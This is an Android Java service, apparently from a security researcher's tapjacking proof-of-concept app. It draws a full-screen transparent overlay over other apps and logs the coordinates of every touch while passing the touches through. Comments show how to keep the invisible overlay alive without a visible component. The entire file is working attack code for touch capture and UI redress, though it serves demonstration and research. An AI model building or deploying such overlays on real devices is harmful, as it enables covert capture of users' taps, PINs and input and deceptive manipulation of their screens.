package tap.nvisium.com.tapjackingmario;

import android.app.Service;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;


public class Tapjacker extends Service implements View.OnTouchListener {

    private View v=null;
    private WindowManager mgr=null;

    @Override
    public void onCreate() {
        super.onCreate();

        int LAYOUT_FLAG;

        v=new View(this);
        v.setOnTouchListener(this);
        mgr=(WindowManager)getSystemService(WINDOW_SERVICE);

        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
            LAYOUT_FLAG = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        }
        else{
            LAYOUT_FLAG = WindowManager.LayoutParams.TYPE_PHONE;
        }

        WindowManager.LayoutParams params
                =new WindowManager.LayoutParams(
                WindowManager.LayoutParams.FILL_PARENT,
                WindowManager.LayoutParams.FILL_PARENT,
                LAYOUT_FLAG,
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                PixelFormat.TRANSPARENT);

        params.gravity=Gravity.FILL_HORIZONTAL|Gravity.FILL_VERTICAL;
        mgr.addView(v, params);

        // stopSelf(); -- uncomment for "component-less" operation
    }

    @Override
    public IBinder onBind(Intent intent) {
        return(null);
    }

    @Override
    public void onDestroy() {
        mgr.removeView(v);  // comment out for "component-less" operation

        super.onDestroy();
    }

    public boolean onTouch(View v, MotionEvent event) {
        Log.w("Tapjacker",
                String.valueOf(event.getX())+":"+String.valueOf(event.getY()));

        return(false);
    }



}
